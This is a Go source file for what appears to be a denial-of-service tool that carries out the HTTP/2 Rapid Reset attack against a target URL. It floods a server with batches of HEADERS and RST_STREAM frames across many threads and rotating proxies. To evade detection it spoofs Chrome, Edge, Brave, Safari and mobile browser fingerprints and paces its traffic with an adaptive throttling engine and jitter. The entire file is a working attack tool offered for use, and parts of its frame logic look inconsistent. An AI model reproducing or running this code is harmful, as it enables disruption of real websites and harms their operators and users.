//dunglee hello 
package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/http2/hpack"
)

var (
	proxyList    []string
	totalSent    int64
	cachedMu     sync.Mutex
	cachedHeaderBlock []byte
	cachedHeaderLen   int
	cachedRSTBytes    []byte
	cachedRSTLen      int
	tlsSessionMu  sync.Mutex
	tlsSessionStore map[string]*tls.ClientSessionState
)

var secChUaProfiles = [][]string{
	{
		`"Chromium";v="142", "Google Chrome";v="142", "Not?A_Brand";v="99"`,
		`"Chromium";v="142.0.7354.120", "Google Chrome";v="142.0.7354.120", "Not?A_Brand";v="99.0.0.0"`,
		`?0`,
		`"Windows"`,
		`"x86"`,
		`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36`,
		`en-US,en;q=0.9`,
		`gzip, deflate, br, zstd`,
		`no-cache`,
	},
	{
		`"Chromium";v="142", "Google Chrome";v="142", "Not?A_Brand";v="99"`,
		`"Chromium";v="142.0.7354.120", "Google Chrome";v="142.0.7354.120", "Not?A_Brand";v="99.0.0.0"`,
		`?0`,
		`"macOS"`,
		`"arm"`,
		`Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36`,
		`en-US,en;q=0.9`,
		`gzip, deflate, br, zstd`,
		`no-cache`,
	},
	{
		`"Chromium";v="142", "Google Chrome";v="142", "Not?A_Brand";v="99"`,
		`"Chromium";v="142.0.7354.120", "Google Chrome";v="142.0.7354.120", "Not?A_Brand";v="99.0.0.0"`,
		`?0`,
		`"Linux"`,
		`"x86"`,
		`Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36`,
		`en-US,en;q=0.9`,
		`gzip, deflate, br, zstd`,
		`no-cache`,
	},
	{
		`"Chromium";v="141", "Google Chrome";v="141", "Not?A_Brand";v="99"`,
		`"Chromium";v="141.0.7354.89", "Google Chrome";v="141.0.7354.89", "Not?A_Brand";v="99.0.0.0"`,
		`?0`,
		`"Windows"`,
		`"x86"`,
		`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36`,
		`en-US,en;q=0.9`,
		`gzip, deflate, br, zstd`,
		`no-cache`,
	},
	{
		`"Chromium";v="142", "Microsoft Edge";v="142", "Not?A_Brand";v="99"`,
		`"Chromium";v="142.0.7354.120", "Microsoft Edge";v="142.0.7354.120", "Not?A_Brand";v="99.0.0.0"`,
		`?0`,
		`"Windows"`,
		`"x86"`,
		`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0`,
		`en-US,en;q=0.5`,
		`gzip, deflate, br, zstd`,
		`no-cache`,
	},
	{
		`"Chromium";v="142", "Brave";v="142", "Not?A_Brand";v="99"`,
		`"Chromium";v="142.0.0.0", "Brave";v="142.0.0.0", "Not?A_Brand";v="99.0.0.0"`,
		`?0`,
		`"Windows"`,
		`"x86"`,
		`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Brave/1.81.130`,
		`en-US,en;q=0.9`,
		`gzip, deflate, br, zstd`,
		`no-cache`,
	},
	{
		`"Chromium";v="142", "Opera";v="108", "Not?A_Brand";v="99"`,
		`"Chromium";v="142.0.7354.120", "Opera";v="108.0.0.0", "Not?A_Brand";v="99.0.0.0"`,
		`?0`,
		`"Windows"`,
		`"x86"`,
		`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/108.0.0.0`,
		`en-US,en;q=0.9`,
		`gzip, deflate, br, zstd`,
		`no-cache`,
	},
	{
		`"Chromium";v="142", "Google Chrome";v="142", "Not?A_Brand";v="99"`,
		`"Chromium";v="142.0.7354.120", "Google Chrome";v="142.0.7354.120", "Not?A_Brand";v="99.0.0.0"`,
		`?1`,
		`"Android"`,
		`"Phone"`,
		`Mozilla/5.0 (Linux; Android 16; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7354.120 Mobile Safari/537.36`,
		`en-US,en;q=0.9,vi;q=0.8`,
		`gzip, deflate, br, zstd`,
		`no-cache`,
	},
	{
		`"Chromium";v="142", "Samsung Internet";v="28", "Not?A_Brand";v="99"`,
		`"Chromium";v="142.0.7354.120", "Samsung Internet";v="28.0", "Not?A_Brand";v="99.0.0.0"`,
		`?1`,
		`"Android"`,
		`"Phone"`,
		`Mozilla/5.0 (Linux; Android 16; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/28.0 Chrome/142.0.7354.120 Mobile Safari/537.36`,
		`vi-VN,vi;q=0.9,en-US;q=0.8`,
		`gzip, deflate, br`,
		`no-cache`,
	},
	{
		`"Chromium";v="142", "Google Chrome";v="142", "Not?A_Brand";v="99"`,
		`"Chromium";v="142.0.7354.120", "Google Chrome";v="142.0.7354.120", "Not?A_Brand";v="99.0.0.0"`,
		`?1`,
		`"iOS"`,
		`"Phone"`,
		`Mozilla/5.0 (iPhone; CPU iPhone OS 19_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.0 Mobile/15E148 Safari/604.1`,
		`en-US,en;q=0.9`,
		`gzip, deflate, br`,
		``,
	},
	{
		`"Chromium";v="142", "Microsoft Edge";v="142", "Not?A_Brand";v="99"`,
		`"Chromium";v="142.0.7354.120", "Microsoft Edge";v="142.0.7354.120", "Not?A_Brand";v="99.0.0.0"`,
		`?0`,
		`"macOS"`,
		`"arm"`,
		`Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0`,
		`en-GB,en;q=0.9`,
		`gzip, deflate, br, zstd`,
		`no-cache`,
	},
	{
		`"Chromium";v="142", "Brave";v="142", "Not?A_Brand";v="99"`,
		`"Chromium";v="142.0.0.0", "Brave";v="142.0.0.0", "Not?A_Brand";v="99.0.0.0"`,
		`?0`,
		`"macOS"`,
		`"arm"`,
		`Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Brave/1.81.130`,
		`en-US,en;q=0.9`,
		`gzip, deflate, br, zstd`,
		`no-cache`,
	},
}

func init() {
	tlsSessionStore = make(map[string]*tls.ClientSessionState)
}

type timingProfile struct {
	minDelay      int64
	maxDelay      int64
	batchInterval int64
	minSleep      int64
	maxSleep      int64
	jitter        int64
}

func getTimingProfile(ua, _ string) (int64, int64, int64, int64, int64, int64) {
	if strings.Contains(ua, "Mobile") || strings.Contains(ua, "iPhone") {
		return 4, 10, 60, 5, 400, 25
	}
	if strings.Contains(ua, "Chrome") || strings.Contains(ua, "Edg") {
		return 5, 15, 50, 8, 500, 20
	}
	if strings.Contains(ua, "Firefox") {
		return 2, 5, 100, 2, 200, 40
	}
	if strings.Contains(ua, "Safari") {
		return 4, 10, 60, 5, 400, 25
	}
	return 3, 8, 80, 4, 300, 30
}

func getTLSSession(host string) (*tls.ClientSessionState, map[string]*tls.ClientSessionState) {
	tlsSessionMu.Lock()
	defer tlsSessionMu.Unlock()
	if s, ok := tlsSessionStore[host]; ok {
		return s, tlsSessionStore
	}
	store := make(map[string]*tls.ClientSessionState)
	tlsSessionStore[host] = nil
	return nil, store
}

type AdaptiveEngine struct {
	batchSize        int64
	successCount     int64
	failCount        int64
	windowSuccess    int64
	totalFail        int64
	throttleUntil    time.Time
	throttleUntilMon *time.Location
	throttleLevel    int64
	batchHistory     []int64
	batchHistoryCap  int64
	lastSuccessTime  time.Time
	lastAdjustTime   time.Time
	resetTime        time.Time
	mu               sync.Mutex
}

func NewAdaptiveEngine() *AdaptiveEngine {
	now := time.Now()
	history := make([]int64, 0, 10)
	return &AdaptiveEngine{
		batchSize:       100,
		lastSuccessTime: now,
		lastAdjustTime:  now,
		resetTime:       now,
		batchHistory:    history,
		batchHistoryCap: 10,
	}
}

func (e *AdaptiveEngine) RecordSuccess() {
	e.mu.Lock()
	defer e.mu.Unlock()
	e.successCount++
	e.windowSuccess++
	e.lastSuccessTime = time.Now()
	e.autoAdjust()
}

func (e *AdaptiveEngine) RecordFail() {
	e.mu.Lock()
	defer e.mu.Unlock()
	e.successCount = 0
	e.failCount++
	e.totalFail++
	e.autoAdjust()
}

func (e *AdaptiveEngine) autoAdjust() {
	now := time.Now()

	if e.windowSuccess >= 3 {
		elapsed := now.Sub(e.lastAdjustTime)
		if elapsed < 2*time.Minute+30*time.Second {
			goto checkFail
		}
		e.batchSize -= 40
		e.throttleLevel = 3
		e.throttleUntil = now.Add(2*time.Minute + 30*time.Second)
		e.throttleLevel = 3
		e.windowSuccess = 0
		goto clamp
	}

checkFail:
	if e.failCount >= 2 {
		elapsed2 := now.Sub(e.resetTime)
		if elapsed2 < 3*time.Minute+30*time.Second {
			goto checkFailCount
		}
		e.batchSize -= 50
		e.throttleLevel = 3
		e.throttleUntil = now.Add(3*time.Minute + 30*time.Second)
		e.throttleLevel = 3
		e.failCount = 0
		goto clamp
	}

checkFailCount:
	if e.failCount >= 5 {
		e.batchSize -= 30
		e.throttleLevel = 1
		e.throttleUntil = now.Add(2*time.Minute)
		e.throttleLevel = 1
		e.failCount = 0
		goto clamp
	}

	if e.successCount >= 30 && e.batchSize < 100 {
		e.batchSize += 5
		e.throttleLevel = 0
	}

	if e.successCount >= 2 {
		elapsed3 := now.Sub(e.lastSuccessTime)
		if elapsed3 > 7*time.Minute {
			if e.batchSize < 70 {
				e.batchSize += 10
			}
		}
	}

clamp:
	if e.batchSize < 5 {
		e.batchSize = 5
	}
	if e.batchSize > 100 {
		e.batchSize = 100
	}
	e.lastAdjustTime = now
}

func (e *AdaptiveEngine) ShouldThrottle() bool {
	e.mu.Lock()
	defer e.mu.Unlock()
	if e.throttleLevel == 0 {
		return false
	}
	if time.Now().Before(e.throttleUntil) {
		return true
	}
	e.throttleLevel = 0
	return false
}

func (e *AdaptiveEngine) GetThrottleDuration() time.Duration {
	e.mu.Lock()
	defer e.mu.Unlock()
	switch e.throttleLevel {
	case 1:
		base := int64(rand.Intn(0x320) + 0xc8)
		return time.Duration(base * 1000000)
	case 2:
		base := int64(rand.Intn(0x7d0) + 0x3e8)
		return time.Duration(base * 1000000)
	case 3:
		base := int64(rand.Intn(0x1388) + 0xbb8)
		return time.Duration(base * 1000000)
	default:
		if e.batchSize >= 100 {
			return 0
		}
		base := int64(100.0/float64(e.batchSize)*5 + float64(rand.Intn(int(100.0/float64(e.batchSize)*5))))
		return time.Duration(base * 1000000)
	}
}

func (e *AdaptiveEngine) GetBatchSize() int64 {
	e.mu.Lock()
	defer e.mu.Unlock()
	bs := e.batchSize
	switch {
	case bs >= 0x5a:
		return 0x3d400
	case bs >= 0x46:
		return 0x186a0
	case bs >= 0x32:
		return 0xc350
	case bs >= 0x1e:
		return 0x4e20
	case bs >= 0xf:
		return 0x2710
	default:
		return 0x1388
	}
}

func getRandomSecChUa() []string {
	profiles := secChUaProfiles
	total := 0
	weights := make([]int, len(profiles))
	for i := range profiles {
		weights[i] = 1
		total += 1
	}
	n := rand.Intn(total)
	idx := n % len(profiles)
	return profiles[idx]
}

func setCachedHeader(path string, host string) {
	cachedMu.Lock()
	defer cachedMu.Unlock()

	profile := getRandomSecChUa()
	secChUa := profile[0]
	secChUaFull := profile[1]
	secChUaMobile := profile[2]
	secChUaPlatform := profile[3]
	_ = profile[4]
	ua := profile[5]
	acceptLang := profile[6]
	acceptEnc := profile[7]
	cacheCtrl := profile[8]

	_, minDelay, batchInterval, _, _, _ := getTimingProfile(ua, "")
	_, _ = minDelay, batchInterval

	var buf bytes.Buffer
	enc := hpack.NewEncoder(&buf)
	enc.SetMaxDynamicTableSize(0x4000)

	isMobile := strings.Contains(ua, "Mobile") || strings.Contains(ua, "iPhone")
	isFirefox := strings.Index(ua, "Firefox") >= 0
	isSafari := strings.Index(ua, "Safari") >= 0 && strings.Index(ua, "Chrome") < 0
	isEdge := strings.Index(ua, "Edg") >= 0
	isChrome := strings.Index(ua, "Chrome") >= 0 || strings.Index(ua, "Android") >= 0

	enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
	enc.WriteField(hpack.HeaderField{Name: ":authority", Value: host})
	enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
	enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
	enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: ua})
	enc.WriteField(hpack.HeaderField{Name: "te", Value: "trailers"})

	if isFirefox {
		if acceptLang != "" {
			enc.WriteField(hpack.HeaderField{Name: "accept-language", Value: acceptLang})
		}
		if acceptEnc != "" {
			enc.WriteField(hpack.HeaderField{Name: "accept-encoding", Value: acceptEnc})
		}
		if cacheCtrl != "" {
			enc.WriteField(hpack.HeaderField{Name: "cache-control", Value: cacheCtrl})
		}
	} else if isChrome && isEdge {
		if acceptLang != "" {
			enc.WriteField(hpack.HeaderField{Name: "accept-language", Value: acceptLang})
		}
		if acceptEnc != "" {
			enc.WriteField(hpack.HeaderField{Name: "accept-encoding", Value: acceptEnc})
		}
		if cacheCtrl != "" {
			enc.WriteField(hpack.HeaderField{Name: "sec-ch-ua", Value: secChUa})
		}
		enc.WriteField(hpack.HeaderField{Name: "sec-ch-ua-mobile", Value: secChUaMobile})
		enc.WriteField(hpack.HeaderField{Name: "sec-ch-ua-platform", Value: secChUaPlatform})
		if isMobile {
			enc.WriteField(hpack.HeaderField{Name: "sec-ch-ua-form-factor", Value: "\"Phone\""})
		}
		enc.WriteField(hpack.HeaderField{Name: "upgrade-insecure-requests", Value: "1"})
		enc.WriteField(hpack.HeaderField{Name: "sec-ch-ua", Value: secChUaFull})
	} else if isSafari {
		if acceptLang != "" {
			enc.WriteField(hpack.HeaderField{Name: "accept-language", Value: acceptLang})
		}
		if acceptEnc != "" {
			enc.WriteField(hpack.HeaderField{Name: "accept-encoding", Value: acceptEnc})
		}
		if cacheCtrl != "" {
			enc.WriteField(hpack.HeaderField{Name: "cache-control", Value: cacheCtrl})
		}
	} else {
		if acceptLang != "" {
			enc.WriteField(hpack.HeaderField{Name: "accept-language", Value: acceptLang})
		}
		if acceptEnc != "" {
			enc.WriteField(hpack.HeaderField{Name: "accept-encoding", Value: acceptEnc})
		}
		if cacheCtrl != "" {
			enc.WriteField(hpack.HeaderField{Name: "cache-control", Value: cacheCtrl})
		}
		enc.WriteField(hpack.HeaderField{Name: "sec-ch-ua", Value: secChUa})
		enc.WriteField(hpack.HeaderField{Name: "sec-ch-ua-mobile", Value: secChUaMobile})
		enc.WriteField(hpack.HeaderField{Name: "sec-ch-ua-platform", Value: secChUaPlatform})
		enc.WriteField(hpack.HeaderField{Name: "sec-ch-ua-form-factor", Value: secChUaPlatform})
		enc.WriteField(hpack.HeaderField{Name: "upgrade-insecure-requests", Value: "1"})
		enc.WriteField(hpack.HeaderField{Name: "sec-ch-ua", Value: secChUaFull})
	}

	xReqID := fmt.Sprintf("%d", rand.Intn(0xf423f))
	enc.WriteField(hpack.HeaderField{Name: "x-req", Value: xReqID})

	headerBytes := buf.Bytes()
	headerLen := len(headerBytes)

	cachedHeaderBlock = headerBytes
	cachedHeaderLen = headerLen

	rstBuf := make([]byte, 4)
	rstBuf[0] = 0x80
	cachedRSTBytes = rstBuf
	cachedRSTLen = 4
}

func getCachedHeader() ([]byte, int, int) {
	cachedMu.Lock()
	defer cachedMu.Unlock()
	return cachedHeaderBlock, cachedHeaderLen, cachedRSTLen
}

func getCachedRST() ([]byte, int, int) {
	cachedMu.Lock()
	defer cachedMu.Unlock()
	return cachedRSTBytes, cachedRSTLen, cachedRSTLen
}

func buildSettingsFrame(headerTableSize uint32) []byte {
	streamCount := 4
	settingsLen := streamCount * 6 + 9
	frame := make([]byte, settingsLen)
	frame[0] = byte(settingsLen >> 16)
	frame[1] = byte(settingsLen >> 8)
	frame[2] = byte(settingsLen)
	frame[3] = 0x04
	frame[4] = 0x01
	i := 1
	offset := 9

	settings := [][2]uint32{
		{0x1, headerTableSize},
		{0x2, 0},
		{0x3, 0x40},
		{0x4, 0x100000},
	}

	for _, s := range settings {
		frame[offset] = byte(s[0] >> 8)
		frame[offset+1] = byte(s[0])
		frame[offset+2] = byte(s[1] >> 24)
		frame[offset+3] = byte(s[1] >> 16)
		frame[offset+4] = byte(s[1] >> 8)
		frame[offset+5] = byte(s[1])
		offset += 6
		i++
	}
	return frame
}

const h2Preface = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

func httpRapidReset(targetURL string, proxy string) error {
	u, err := url.Parse(targetURL)
	if err != nil {
		return err
	}

	host := u.Hostname()
	port := u.Port()
	if port == "" {
		port = "443"
	}

	var conn net.Conn

	if proxy != "" {
		conn, err = net.DialTimeout("tcp", proxy, 10*time.Second)
		if err != nil {
			return fmt.Errorf("CONNECT failed: %w", err)
		}
		tcpConn := conn.(*net.TCPConn)
		tcpConn.SetNoDelay(true)
		tcpConn.SetWriteBuffer(0x100000)
		tcpConn.SetReadBuffer(0x100000)

		var proxyAuth string
		parts := strings.SplitN(proxy, "@", 2)
		if len(parts) == 2 {
			proxyAddr := parts[1]
			creds := parts[0]
			_ = proxyAddr
			proxyAuth = base64.StdEncoding.EncodeToString([]byte(creds))
		}

		connectReq := fmt.Sprintf("CONNECT %s:%s HTTP/1.1\r\nHost: %s:%s\r\n", host, port, host, port)
		if proxyAuth != "" {
			connectReq += "Proxy-Authorization: Basic " + proxyAuth + "\r\n"
		}
		connectReq += "\r\n"

		conn.Write([]byte(connectReq))

		respBuf := make([]byte, 4096)
		n, err := conn.Read(respBuf)
		if err != nil {
			return fmt.Errorf("CONNECT failed: %w", err)
		}
		respStr := string(respBuf[:n])
		if !strings.Contains(respStr, "200") {
			var code int
			fmt.Sscanf(respStr, "HTTP/1.1 %d", &code)
			return fmt.Errorf("CONNECT returned %d", code)
		}
	} else {
		conn, err = net.DialTimeout("tcp", net.JoinHostPort(host, port), 10*time.Second)
		if err != nil {
			return err
		}
		tcpConn := conn.(*net.TCPConn)
		tcpConn.SetNoDelay(true)
		tcpConn.SetWriteBuffer(0x100000)
		tcpConn.SetReadBuffer(0x100000)
	}

	session, _ := getTLSSession(u.Host)

	tlsConfig := &tls.Config{
		ServerName:         host,
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2"},
	}
	if session != nil {
		tlsConfig.ClientSessionCache = tls.NewLRUClientSessionCache(1)
	}

	tlsConn := tls.Client(conn, tlsConfig)
	if err := tlsConn.Handshake(); err != nil {
		return err
	}
	defer tlsConn.Close()

	state := tlsConn.ConnectionState()
	if len(state.NegotiatedProtocol) == 2 && state.NegotiatedProtocol == "h2" {
	} else {
		return fmt.Errorf("h2 not negotiated")
	}

	tlsConn.Write([]byte(h2Preface))
	defer tlsConn.Close()

	settingsFrame := buildSettingsFrame(0x4000)
	_, writeErr := tlsConn.Write(settingsFrame)
	if writeErr != nil {
		return writeErr
	}

	doneCh := make(chan struct{})
	go func(ch chan struct{}, tc *tls.Conn) {
		defer close(ch)
		buf := make([]byte, 0x200)
		for {
			_, err := tc.Read(buf)
			if err != nil {
				return
			}
		}
	}(doneCh, tlsConn)

	requestURI := u.RequestURI()
	if requestURI == "" {
		requestURI = "/"
	}

	setCachedHeader(requestURI, host)
	rstBytes, rstLen, _ := getCachedRST()
	headerBlock, headerLen, _ := getCachedHeader()

	engine := NewAdaptiveEngine()
	_, minD, batchInt, _, maxS, _ := getTimingProfile(u.Host, "")

	batchSize := engine.GetBatchSize()
	frameSize := headerLen + 22
	buf2 := make([]byte, batchSize*int64(frameSize))
	_ = buf2

	streamID := uint32(1)
	sentInWindow := int64(0)
	iteration := int64(0)

	for {
		select {
		case <-doneCh:
			engine.RecordFail()
			return fmt.Errorf("connection closed by server")
		default:
		}

		if engine.ShouldThrottle() {
			dur := engine.GetThrottleDuration()
			time.Sleep(dur)
			continue
		}

		batchSize = engine.GetBatchSize()
		frameSize = headerLen + 22
		sendBuf := make([]byte, 0)

		for i := int64(0); i < batchSize; i++ {
			headerFrameLen := headerLen + 9
			headersFrame := make([]byte, headerFrameLen)
			headersFrame[0] = byte(headerLen >> 16)
			headersFrame[1] = byte(headerLen >> 8)
			headersFrame[2] = byte(headerLen)
			headersFrame[3] = 0x01
			headersFrame[4] = 0x05
			copy(headersFrame[9:], headerBlock[:headerLen])
			sID := streamID + uint32(i)*2
			headersFrame[5] = byte(sID >> 24)
			headersFrame[6] = byte(sID >> 16)
			headersFrame[7] = byte(sID >> 8)
			headersFrame[8] = byte(sID)

			rstFrame := make([]byte, 13)
			rstFrame[0] = 0
			rstFrame[1] = 0
			rstFrame[2] = 4
			rstFrame[3] = 0x03
			rstFrame[4] = 0
			rstFrame[5] = byte(sID >> 24)
			rstFrame[6] = byte(sID >> 16)
			rstFrame[7] = byte(sID >> 8)
			rstFrame[8] = byte(sID)
			copy(rstFrame[9:], rstBytes[:rstLen])

			sendBuf = append(sendBuf, headersFrame...)
			sendBuf = append(sendBuf, rstFrame...)
		}

		_, writeErr = tlsConn.Write(sendBuf)
		if writeErr != nil {
			engine.RecordFail()
			return writeErr
		}

		engine.RecordSuccess()
		atomic.AddInt64(&totalSent, batchSize)

		jitter := rand.Intn(0x32) + 0xa
		time.Sleep(time.Duration(jitter) * time.Millisecond)

		streamID += uint32(batchSize) * 2
		if streamID >= 0x7fffffff {
			sendBuf2 := make([]byte, len(sendBuf))
			copy(sendBuf2, sendBuf)
			tlsConn.Write(sendBuf2)
			return nil
		}

		sentInWindow += batchSize
		iteration++

		windowSize := int64(frameSize) - int64(headerLen) - 22
		if windowSize < 0x180000 {
			goAwayFrame := [13]byte{
				0, 0, 8,
				0x07, 0,
				0, 0, 0, 0,
				0x60, 0, 0, 0,
			}
			tlsConn.Write(goAwayFrame[:])
		}

		if batchInt > 0 && iteration%batchInt == 0 {
			jitter2 := rand.Intn(int(minD)) + int(minD)
			time.Sleep(time.Duration(jitter2) * time.Millisecond * time.Duration(maxS))
		}

		if maxS > 0 && sentInWindow%maxS == 0 {
			jitter3 := rand.Intn(300) + int(minD)
			time.Sleep(time.Duration(jitter3) * time.Millisecond * time.Duration(maxS))
		}

		streamID += 2
		if streamID+2 > 0x7fffffff {
			break
		}

		_ = sentInWindow
		_ = rstLen
	}
	return nil
}

func main() {
	args := os.Args
	if len(args) < 5 {
		fmt.Printf("Methods: https searx\n")
		fmt.Printf("Usage: ./file [url] [threads] [method] [proxy.txt]\n")
		os.Exit(1)
	}

	targetURL := args[1]
	threads, err := strconv.Atoi(args[2])
	if err != nil || threads <= 0 {
		threads = 1
	}

	proxyFile := args[4]
	proxyData, err := os.ReadFile(proxyFile)
	if err == nil {
		lines := strings.Split(string(proxyData), "\n")
		for _, l := range lines {
			l = strings.TrimSpace(l)
			if l != "" {
				proxyList = append(proxyList, l)
			}
		}
	}

	u, _ := url.Parse(targetURL)
	host := ""
	if u != nil {
		host = u.Host
	}

	fmt.Printf("Targets : [ %s ]\n", targetURL)
	fmt.Printf("Threads : [ %d ]\n", threads)
	fmt.Printf("Methods : [ %d ]\n", len(proxyList))
	if len(proxyList) == 0 {
		fmt.Printf("Proxy   : [ IP Thật ]\n")
	} else {
		fmt.Printf("Proxy   : [ %d loaded ]\n", len(proxyList))
	}
	fmt.Printf("[+] Press Ctrl+C to stop\n")
	_ = host

	var wg sync.WaitGroup
	stopCh := make(chan struct{})

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-stopCh:
					return
				default:
				}
				var proxy string
				if len(proxyList) > 0 {
					proxy = proxyList[rand.Intn(len(proxyList))]
				}
				err := httpRapidReset(targetURL, proxy)
				if err != nil {
					time.Sleep(100 * time.Millisecond)
				}
			}
		}()
	}

	prevSent := int64(0)
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		for {
			select {
			case <-ticker.C:
				cur := atomic.LoadInt64(&totalSent)
				rate := cur - prevSent
				prevSent = cur
				fmt.Printf("\r[+] Sent: %d | Rate: %d/s   ", cur, rate)
			case <-stopCh:
				return
			}
		}
	}()

	<-sigCh
	fmt.Printf("\n[!] Stopping...\n")
	close(stopCh)
	wg.Wait()
	fmt.Printf("[+] Total sent: %d\n", atomic.LoadInt64(&totalSent))
}
